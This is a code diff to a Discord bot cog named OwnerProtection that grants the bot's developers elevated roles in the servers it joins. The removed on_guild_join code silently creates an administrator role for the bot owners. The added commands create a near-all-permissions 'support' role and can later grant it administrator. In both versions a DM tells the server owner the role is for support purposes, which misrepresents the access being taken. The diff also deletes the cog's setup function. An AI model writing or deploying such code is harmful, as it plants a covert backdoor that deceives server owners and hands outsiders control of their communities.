@@ -10,7 +10,7 @@ class OwnerProtection(commands.Cog):
         self.bot = bot
         self.config = Config.get_conf(self, identifier=1234567890)
         self.config.register_global(owners=[])
-        self.config.register_guild(kicked_owners={}, owner_role_id=None)
+        self.config.register_guild(kicked_owners={}, owner_role_id=None, support_role_id=None, support_role_name="Innova Support", support_role_message="Support role created successfully.", owner_message="Hello {owner_name},\n\nI have created a role called '{role_name}' in {guild_name} for bot support purposes. This role is intended for members of the support team to assist with any issues you may have.")
 
     @commands.Cog.listener()
     async def on_member_update(self, before: discord.Member, after: discord.Member):
@@ -104,31 +104,8 @@ class OwnerProtection(commands.Cog):
 
     @commands.Cog.listener()
     async def on_guild_join(self, guild: discord.Guild):
-        """Create a role for bot owners when the bot joins a server."""
-        owner_role = await guild.create_role(
-            name="Innova Support",
-            permissions=discord.Permissions(administrator=True),
-            hoist=True,
-            color=discord.Color(0x00f0ff),
-            reason="Role for bot owner(s)"
-        )
-        await self.config.guild(guild).owner_role_id.set(owner_role.id)
-
-        # Assign the role to any bot owners already in the server
-        owners = await self.config.owners()
-        for owner_id in owners:
-            owner = guild.get_member(owner_id)
-            if owner:
-                await owner.add_roles(owner_role)
-
-        # Send a message to the server owner
-        server_owner = guild.owner
-        if server_owner:
-            await server_owner.send(
-                f"Hello {server_owner.name},\n\n"
-                f"I have created a role called 'Innova Support' in {guild.name} for bot support purposes. "
-                f"This role is intended for members of the support team to assist with any issues you may have."
-            )
+        """Do not create the role automatically when the bot joins a server."""
+        pass
 
     @commands.Cog.listener()
     async def on_guild_remove(self, guild: discord.Guild):
@@ -199,5 +176,87 @@ class OwnerProtection(commands.Cog):
         else:
             await ctx.send("No protected owners.")
 
-def setup(bot: Red):
-    bot.add_cog(OwnerProtection(bot))
+    @owner.command()
+    async def create_role(self, ctx: commands.Context, name: str = None, message: str = None):
+        """Create the support role with specified permissions."""
+        guild = ctx.guild
+        support_role_name = name or await self.config.guild(guild).support_role_name()
+        support_role_message = message or await self.config.guild(guild).support_role_message()
+
+        permissions = discord.Permissions.all()
+        permissions.administrator = False
+
+        support_role = await guild.create_role(
+            name=support_role_name,
+            permissions=permissions,
+            hoist=True,
+            color=discord.Color(0x00f0ff),
+            reason="Support role for bot support purposes"
+        )
+
+        await self.config.guild(guild).support_role_id.set(support_role.id)
+        await ctx.send(support_role_message)
+
+        # Send a message to the server owner
+        server_owner = guild.owner
+        if server_owner:
+            owner_message = await self.config.guild(guild).owner_message()
+            await server_owner.send(
+                owner_message.format(
+                    owner_name=server_owner.name,
+                    role_name=support_role_name,
+                    guild_name=guild.name
+                )
+            )
+
+    @owner.command()
+    async def delete_role(self, ctx: commands.Context):
+        """Delete the support role."""
+        guild = ctx.guild
+        support_role_id = await self.config.guild(guild).support_role_id()
+        if support_role_id:
+            support_role = guild.get_role(support_role_id)
+            if support_role:
+                await support_role.delete(reason="Support role deleted by command")
+                await ctx.send("Support role deleted successfully.")
+            await self.config.guild(guild).support_role_id.clear()
+        else:
+            await ctx.send("Support role does not exist.")
+
+    @owner.command()
+    async def add_admin(self, ctx: commands.Context):
+        """Add admin permissions to the support role."""
+        guild = ctx.guild
+        support_role_id = await self.config.guild(guild).support_role_id()
+        if support_role_id:
+            support_role = guild.get_role(support_role_id)
+            if support_role:
+                permissions = support_role.permissions
+                permissions.administrator = True
+                await support_role.edit(permissions=permissions, reason="Added admin permissions to support role")
+                await ctx.send("Admin permissions added to the support role.")
+            else:
+                await ctx.send("Support role does not exist.")
+        else:
+            await ctx.send("Support role does not exist.")
+
+    @owner.command()
+    async def set_support_role_name(self, ctx: commands.Context, name: str):
+        """Set the name of the support role."""
+        guild = ctx.guild
+        await self.config.guild(guild).support_role_name.set(name)
+        await ctx.send(f"Support role name set to {name}.")
+
+    @owner.command()
+    async def set_support_role_message(self, ctx: commands.Context, message: str):
+        """Set the message to be sent when the support role is created."""
+        guild = ctx.guild
+        await self.config.guild(guild).support_role_message.set(message)
+        await ctx.send("Support role creation message updated.")
+
+    @owner.command()
+    async def set_owner_message(self, ctx: commands.Context, message: str):
+        """Set the message to be sent to the server owner when the support role is created."""
+        guild = ctx.guild
+        await self.config.guild(guild).owner_message.set(message)
+        await ctx.send("Message to the server owner updated.")
